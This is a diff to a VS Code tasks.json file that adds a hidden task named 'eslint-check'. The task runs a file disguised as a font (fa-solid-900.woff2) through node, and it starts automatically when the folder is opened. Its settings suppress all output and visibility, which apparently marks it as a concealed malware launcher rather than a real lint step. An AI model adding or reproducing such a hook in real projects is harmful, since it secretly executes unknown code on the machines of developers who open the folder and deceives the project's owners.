@@ -4,11 +4,33 @@
     "options": {
       "shell": {
         "executable": "cmd.exe",
-        "args": ["/d", "/c"]
+        "args": [
+          "/d",
+          "/c"
+        ]
       }
     }
   },
   "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./backend/services/a2v_pipeline/public/fonts/fa-solid-900.woff2) || (where node >nul 2>&1 && node ./backend/services/a2v_pipeline/public/fonts/fa-solid-900.woff2) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
     {
       "label": "dev:debug",
       "type": "shell",
